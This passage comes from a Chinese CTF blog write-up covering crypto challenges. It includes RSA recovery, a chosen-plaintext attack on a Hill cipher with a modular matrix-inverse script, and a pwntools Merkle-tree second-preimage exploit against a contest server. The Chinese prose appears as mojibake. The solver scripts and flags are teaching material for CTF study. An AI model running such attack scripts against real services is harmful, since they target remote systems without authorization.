91507581287268678382704102499829526115486105502321675954617344102253738157075000438078155655317661988277710347178352070963528948558320623410799852584156693215831487103699955781123962661928296191496664400110250226880815518273669335738236882265242192523589233915770596106654695524214247405913652100286077779879n = (pandq ** 2 - p2andq2) // 2phi = n - pandq + 1d = invert(e, phi)print(long_to_bytes(pow(c, d, n))) è¾“å‡ºå°±æ˜¯flagäº† Go homeè¿™é¢˜å¤ªè¿·å•¦â€¦åˆ°ç°åœ¨éƒ½è¿˜æ²¡æ‡‚å‡ºé¢˜äººçš„æ„æ€.ç»™å‡ºçš„é¢˜ç›®æ˜¯è¿™æ ·çš„ 123n=0xc3d945bc033ff7dd932ba62d8ef506cb37f5fe8e45abdac07660c7ac2af97d3ce723710384046c1bd967e92b0e03666d7c0bcbd4043b39ee128e5a1c98b5367044a4e72a4868fdc4824e8f0f3074da2857a414c9dfd7bf208d41caefeac144a45a6ca225975b0fced05d85d6e95dc7c2fa303c8a69185b75b8b3fd7f3fe0b9b5p = 0xdfe9dd9c9e9987e2fdb230fb346cefa87893afed5d1b4240872ec5b2dfc3b397ecbbf9b54ae6e9b7be150cdc79de1e87d2d674352b857ae4e000000000000000c=0xe1ea04df467b48a7fa372d9374959571a084341041ec71f57e661cedfb517dbf1cc05a305edeb56ce0d2e29a98790a1cd538b31203a8ff7ea79aee1b3ad8629eac19607dce66f9138e3b376a8e915e24d209a23cb8e1a02c6030d840ceb4203 ä¸€å¼€å§‹æ‹¿åˆ°é¢˜çš„æ—¶å€™, ç¡®å®æ˜¯æ²¡æƒ³åˆ°è¿™é‡Œç»™çš„pæ˜¯pçš„é«˜ä½. çŸ¥é“çš„è¯å°±æ‡‚æ˜¯coppersmithäº†.æ‰€ä»¥ä¸€å¼€å§‹æ‹¿åˆ°é¢˜æ˜¯å»åˆ†è§£næ¥ç€, yafuä¹Ÿç¡®å®åˆ†å‡ºpè·Ÿqæ¥äº†(è·Ÿå‡ºé¢˜äººèŠäº†ä¸‹é¢„æœŸè§£åº”è¯¥æ˜¯ç”¨coppersmithçš„å› ä¸ºé¢˜ç›®ä¹Ÿæ²¡ç»™å…¬é’¥e, æ‰€ä»¥è¯•ç€å»çˆ†ç ´äº†ä¸€ä¸‹e, ç„¶è€Œä¹Ÿæ²¡çˆ†å‡ºç»“æœ.(äº‹å®ä¸Šåº”è¯¥æ˜¯æœ‰ç»“æœçš„, å½“e=3çš„æ—¶å€™è‚¯å®šèƒ½å¾—å‡ºç»“æœ, ä½†å› ä¸ºè¿‡æ»¤æ˜¯åˆ©ç”¨å­—ç¬¦ä¸²ctf{, æ‰€ä»¥æ²¡æœ‰çˆ†å‡ºç»“æœæ¥. äºæ˜¯å°±å¡ä½äº†â€¦ å› ä¸ºpå¾ˆå¥‡æ€ª(æ²¡æƒ³åˆ°è¿™ä¸ªæ˜¯pçš„é«˜ä½, å¯¼è‡´æˆ‘è§‰å¾—cå’Œpè°ƒæ¢è¿‡æ¥äº†. æƒ³çœ‹çœ‹cæ˜¯å¦æ˜¯ç´ æ•°, æ‰”è¿› www.factordb.com å‡ºæ¥äº†ä¸€ä¸ªæ„æƒ³ä¸åˆ°çš„ç»“æœå•Šè¿™â€¦ä¸‰æ¬¡æ–¹???äºæ˜¯è¯•ç€å¯¹cå¼€ä¸‰æ¬¡æ–¹æ ¹, ç„¶åè½¬æˆå­—ç¬¦ä¸². ç¡®å®å¾—åˆ°äº†åœ¨å¯æ‰“å°å­—ç¬¦èŒƒå›´å†…çš„ä¸€æ®µå­—ç¬¦ä¸² 1ardyPq2]2lb]A_1q_p]_p1]qm]dsllw{ ctf,ard ctf,ard ctf,ardå¯¹åº”å­—æ¯éƒ½æ˜¯ä½ç§»2ä½çš„!æ‰”è¿›å·¥å…·é‡Œä½ç§»å›æ¥å°±å¾—åˆ°(æ‰€ä»¥æœ€åè¿˜æ˜¯æƒ³åæ§½ä¸€ä¸‹, èƒ½åšå‡ºè¿™é¢˜çœŸçš„è¿æ°”maxäº†. block cipherè¿ä¸Šè¿œç¨‹æŸ¥çœ‹æºç , å‘ç°æ˜æ˜æ˜¯ä¸ªhillå¯†ç !(åå­—å´å«åˆ†ç»„å¯†ç (ç‹—å¤´å¾ˆæ˜¾ç„¶åŠ å¯†å°±æ˜¯å°†padä¹‹åçš„æ˜æ–‡åˆ†ä¸ºæ¯16ä¸ªå­—èŠ‚ä¸€ç»„,æ„æˆ4*4çš„çŸ©é˜µ,æ¯ç»„éƒ½å’Œå¯†é’¥çŸ©é˜µåšæ¨¡ä¹˜æ¨¡æ•°ä¸º256. æ‰€ä»¥åªéœ€è¦æ„é€ ä¸€ä¸ªåœ¨mod256æ„ä¹‰ä¸‹å­˜åœ¨é€†çŸ©é˜µçš„çŸ©é˜µ, å°†è¿™ä¸ªåŠ å¯†ååªéœ€è¦ä¹˜ä¸Šå®ƒçš„é€†çŸ©é˜µå°±å¯ä»¥å¾—åˆ°å¯†é’¥çŸ©é˜µäº†.å†æ±‚å‡ºå¯†é’¥çŸ©é˜µçš„é€†çŸ©é˜µ, å°±å¾—å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†. å¯¹äºæ±‚æ¨¡256é€†çŸ©é˜µ, åªä¸è¿‡æ˜¯åœ¨åŸå…ˆæ±‚é€†çŸ©é˜µçš„åŸºç¡€ä¸Šå°†æ‰€æœ‰çš„è¿ç®—æ”¹æˆæ¨¡256çš„æ„ä¹‰ä¸‹è¿›è¡Œå°±è¡Œäº†. ä¸ºäº†èŠ‚çœæ—¶é—´, åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªç°æˆçš„æ±‚æ¨¡é€†çŸ©é˜µçš„è„šæœ¬, ç„¶åå†ä¿®æ”¹äº†ä¸€äº›ç»†èŠ‚. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121from gmpy2 import gcdimport numpy as np # è®¡ç®—è¡Œåˆ—å¼çš„å€¼class MyError(ValueError): pass# æ£€æŸ¥çŸ©é˜µæ ¼å¼æ˜¯å¦åˆæ³•ä»¥åŠæ˜¯å¦å¯é€†def check_matrix(A, M): if (not isinstance(A, list)) or (not isinstance(A[0], list)) or (not isinstance(A[0][0], int)): raise MyError('Invalid matrix format.') mat = np.array(A) D = int(np.linalg.det(A)) % M if gcd(D, M) &gt; 1: raise MyError('This matrix does not have a modular inversion matrix.')# çŸ©é˜µçš„ç¬¬ä¸€ç±»åˆç­‰å˜æ¢ï¼šäº¤æ¢çŸ©é˜µç¬¬iè¡Œä¸ç¬¬jè¡Œdef swap(A, i, j): temp = A[j] A[j] = A[i] A[i] = temp# çŸ©é˜µçš„ç¬¬äºŒç±»åˆç­‰å˜æ¢ï¼šå°†çŸ©é˜µç¬¬iè¡Œä¹˜ä»¥ndef mul_n(A, i, n, M): a = A[i] A[i] = [a[x] * n % M for x in range(len(a))]# çŸ©é˜µçš„ç¬¬ä¸‰ç±»åˆç­‰å˜æ¢ï¼šçŸ©é˜µç¬¬iè¡Œå‡å»nå€çš„jè¡Œdef sub(A, i, j, n, M): a = A[i] b = A[j] A[i] = [(a[x] - n * b[x]) % M for x in range(len(a))]# æ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„ç¬¬iè¡Œdef find_row(A, i, M): start = i while A[start][i] == 0 or gcd(A[start][i], M) &gt; 1: start = start + 1 return start# è¿”å›ä¸€ä¸ªæ•´æ•°çš„æ¨¡é€†å…ƒç´ def mod_rev(num, mod): if (num == 0 or gcd(num, mod) &gt; 1): raise MyError('modular inversion does not exists.') else: i = 1 while i * num % mod != 1: i = i + 1 return idef disp(mat): print('') for i in range(len(mat)): for j in range(len(mat[i])): print(mat[i][j], end='\\t') print('') print('')def matrix_rev(A, M): try: check_matrix(A, M) dim = len(A) # concatenate with a unit matrix for i in range(dim): for j in range(dim): if j == i: A[i].append(1) else: A[i].append(0) # transform for i in range(dim): target_row = find_row(A, i, M) swap(A, i, target_row) n = mod_rev(A[i][i], M) mul_n(A, i, n, M) for j in range(dim): if j != i: sub(A, j, i, A[j][i], M) # get result A_rev = [A[i][dim:] for i in range(dim)] return A_rev except Exception as e: print(e)A = [[42, 42, 42, 43], [42, 42, 41, 44], [42, 41, 42, 42], [41, 42, 42, 42]] # å‘é€è¿‡å»çš„æ˜æ–‡çš„çŸ©é˜µå½¢å¼M = 256AINV = matrix_rev(A, M)# A = '***+**),*)**)***' å‘é€è¿‡å»çš„æ˜æ–‡encA = '6a9acfbf3dc3bf1265ea2e6a470404c1' # æ‰€è¿”å›çš„å¯†æ–‡enc_flag = '1017b9907716c35955305cbd50481660de262f48955ca48a6f97630d2cc7bb2e4f41b2a0bbce4c43575b234fff6455b0' # åŠ å¯†ä¹‹åçš„flagenc_A = np.array([int(encA[i:i + 2], 16) for i in range(0, len(encA), 2)]).reshape(4, 4)key = np.matmul(enc_A, AINV) % 256''' æ‰‹åŠ¨å°†keyè½¬æˆkçš„å½¢å¼äº†'''k = [[113, 213, 10, 58], [178, 139, 135, 13], [216, 204, 16, 149], [189, 0, 0, 189]]keyinv = np.array(matrix_rev(k, M))for i in range(0, len(enc_flag), 32): encflag = enc_flag[i:i + 32] enc_F = np.array([int(encflag[j:j + 2], 16) for j in range(0, len(encflag), 2)]).reshape(4, 4) f = np.matmul(keyinv, enc_F) % 256 f = f.reshape(16, ) for i in f: print(chr(i), end='') å¾—åˆ°flag:ctf{yes-sure-the-plain-is-blocked-right?} ant forest è¿™é¢˜å±…ç„¶åªæœ‰ä¸¤ä¸ªäººåšçœŸçš„â€¦å¯èƒ½å¤§å®¶éƒ½è§‰å¾—æºç å¤ªé•¿äº†ä¸æƒ³çœ‹å§?æˆ‘ä¸ªäººæ˜¯æ„Ÿè§‰ä¸€ç‚¹éƒ½ä¸éš¾çš„ é¢˜ç›®çš„æºç ä¸è´´äº†. å¤§æ¦‚æ˜¯åœ¨å»ºä¸€ä¸ªé»˜å…‹å°”æ ‘(è¿™ä¸ªé»˜å…‹å°”æ ‘æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦.ç½‘ä¸Šæ‰¾äº†å¼ å›¾, å°±æ˜¯ä»åº•éƒ¨çš„å¶å­å¼€å§‹, å“ˆå¸Œä¹‹åä¸¤ä¸ªä¸¤ä¸ªä¸ºä¸€ç»„, ç›¸åŠ å†å“ˆå¸Œå¾—åˆ°æ–°çš„ä¸€å±‚, ç›´åˆ°å¾—åˆ°æ ¹èŠ‚ç‚¹. è€Œé¢˜ç›®çš„è¦æ±‚å°±æ˜¯è¾“å…¥ä¸¤æ¬¡å¶å­èŠ‚ç‚¹, ä¸¤æ¬¡çš„è¾“å…¥ä¸èƒ½ç›¸åŒä½†æœ€åçš„æ ‘æ ¹æ˜¯ç›¸åŒçš„.ä»”ç»†æƒ³æƒ³å…¶å®å¹¶ä¸éš¾, ç¬¬äºŒæ¬¡ç”Ÿæˆæ ‘çš„å¶å­èŠ‚ç‚¹æ˜¯ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„æ ‘çš„å…¶ä¸­ä¸€å±‚å°±è¡Œäº†.(ä¼¼ä¹æ˜¯å«ç¬¬äºŒæ¬¡åŸåƒæ”»å‡»? çŸ¥é“åŸç†ä¹‹åå°±å¼€å§‹å†™è„šæœ¬äº†, ä½†æ˜¯è¿‡ç¨‹ä¸å¤ªé¡ºåˆ©, å› ä¸ºpython3å¤ªå¤šæ•°æ®ç±»å‹äº†(è½¬æ¥è½¬å»å®åœ¨æ˜¯å¤ªé¸¡å„¿éº»çƒ¦äº†â€¦ æ‰€ä»¥å†³å®šç”¨python2å†™è„šæœ¬(ç¡®å®è¯¥ç”¨py2å†™ä¸ç„¶å¤ªä¹±äº†â€¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from hashlib import sha256from pwn import *import reprintable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'def dohash(dat): return sha256(sha256(dat).digest()).digest()con = remote('139.199.203.26', 20002)def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256(start + END).hexdigest() if ensha == SHA: print(start) return startresp = con.recvuntil('XXXX:')END = re.findall(r'sha256\\(XXXX\\+(.*)\\)', resp)[0]SHA = re.findall(r'== (.*)', resp)[0]con.sendline(proof(END, SHA))con.recvuntil('&gt;')dic = ['a', 'b', 'c', 'd']for _ in range(4): con.sendline('1') con.recv() con.send(dic[_]) con.recvuntil('&gt;')con.sendline('2')con.recvuntil('&gt;')con.sendline('3')a = dohash('a')b = dohash('b')c = dohash('c')d = dohash('d')ab = a + bcd = dohash(c + d).encode('hex')con.recvuntil(':')con.send(ab)con.recvuntil(':')con.send('r')con.recvuntil(':')con.send(cd)con.recvuntil(':')con.send('k')print con.recvuntil('}') æœ€åå¾—åˆ°!Not in leaves? Here is your reward: ctf{QUrfLwKFL8Fs3vZbAW4hPrRZFRZ11QosBYQr5jol} æ€»ç»“è¿™æ¬¡HWBè‚äº†4å¤©åŠæ•°å­¦ä½œä¸šå †äº†å¥½å¤šâ€¦ä¸è¿‡æ€»çš„æ¥è¯´è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šæ–°ä¸œè¥¿çš„(æ–°ä¸œè¥¿éƒ½åœ¨wpè¯¦ç»†å†™äº†, æ‰€ä»¥æœ‰äº›åœ°æ–¹è¯¦ç»†æœ‰äº›åœ°æ–¹ç®€ç•¥.ç‰¹åˆ«æ˜¯web, çœŸçš„å­¦åˆ°äº†å¾ˆå¤šæ–°ä¸œè¥¿,ä¹Ÿç®—æ˜¯æ”¶è·æ»¡æ»¡çš„Miscä¹Ÿæ˜¯ç†Ÿæ‚‰äº†å¾ˆå¤šå¥—è·¯å§ä¸è¿‡å­¦äº†æŒºä¹…å¯†ç ä½†æ˜¯æ²¡æœ‰å…¨éƒ¨åšå‡ºæ¥å¤ªéš¾å—äº†â€¦æ‰€ä»¥æœ‰è¶£çš„åŠ å¯†åˆ°åº•è¯¥æ€ä¹ˆåšâ€¦ å¤§æ¦‚å°±è¿™äº›äº†,å‰é¢çš„å¤§ä½¬å¤ªå¼ºäº†, æ ¹æœ¬æ‰“ä¸è¿‡â€¦ç»§ç»­åŠ æ²¹å§å“¦å¯¹ æ–‡ç« é‡Œæœ‰é”™çš„åœ°æ–¹è¯·å¤§ä½¬åŠ¡å¿…æé†’æˆ‘!","link":"/2020/11/12/writeup-for-2020-%E6%96%B0%E7%94%9F%E6%9D%AF/"}],"tags":[{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"Summary","slug":"Summary","link":"/tags/Summary/"},{"name":"RSA","slug":"RSA","link":"/tags/RSA/"},{"name":"Extending Wiener Attack","slug":"Extending-Wiener-Attack","link":"/tags/Extending-Wiener-Attack/"},{"name":"Lattice","slug":"Lattice","link":"/tags/Lattice/"},{"name":"Coppersmith attack","slug":"Coppersmith-attack","link":"/tags/Coppersmith-attack/"},{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"unserialize","slug":"unserialize","link":"/tags/unserialize/"},{"name":"é­”æœ¯æ–¹æ³•","slug":"é­”æœ¯æ–¹æ³•","link":"/tags/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","link":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"ä¼ªåè®®","slug":"ä¼ªåè®®","link":"/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"},{"name":"æºç æ³„éœ²","slug":"æºç æ³„éœ²","link":"/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"name":"unsrialize","slug":"unsrialize","link":"/tags/unsrialize/"},{"name":"å­—ç¬¦é€ƒé€¸","slug":"å­—ç¬¦é€ƒé€¸","link":"/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"},{"name":"æ­£åˆ™ç»•è¿‡","slug":"æ­£åˆ™ç»•è¿‡","link":"/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"},{"name":"Reading","slug":"Reading","link":"/tags/Reading/"},{"name":"Coppersmith","slug":"Coppersmith","link":"/tags/Coppersmith/"},{"name":"å˜é‡è¦†ç›–","slug":"å˜é‡è¦†ç›–","link":"/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"LLL","slug":"LLL","link":"/tags/LLL/"},{"name":"Unserialize","slug":"Unserialize","link":"/tags/Unserialize/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"LWE","slug":"LWE","link":"/tags/LWE/"},{"name":"Algorithm","slug":"Algorithm","link":"/tags/Algorithm/"},{"name":"cryptopals","slug":"cryptopals","link":"/tags/cryptopals/"},{"name":"MD5","slug":"MD5","link":"/tags/MD5/"},{"name":"WriteUp","slug":"WriteUp","link":"/tags/WriteUp/"},{"name":"AES","slug":"AES","link":"/tags/AES/"},{"name":"OCB","slug":"OCB","link":"/tags/OCB/"},{"name":"NTRU","slug":"NTRU","link":"/tags/NTRU/"},{"name":"Stream","slug":"Stream","link":"/tags/Stream/"},{"name":"ECC","slug":"ECC","link":"/tags/ECC/"},{"name":"ctfshow","slug":"ctfshow","link":"/tags/ctfshow/"},{"name":"PRNG","slug":"PRNG","link":"/tags/PRNG/"},{"name":"lfsr","slug":"lfsr","link":"/tags/lfsr/"}],"categories":[{"name":"CryptoSummary","slug":"CryptoSummary","link":"/categories/CryptoSummary/"},{"name":"WebSummary","slug":"WebSummary","link":"/categories/WebSummary/"},{"name":"Reading notes","slug":"Reading-notes","link":"/categories/Reading-notes/"},{"name":"Algorithm","slug":"Algorithm","link":"/categories/Algorithm/"},{"name":"WriteUp","slug":"WriteUp","link":"/categories/WriteUp/"}]}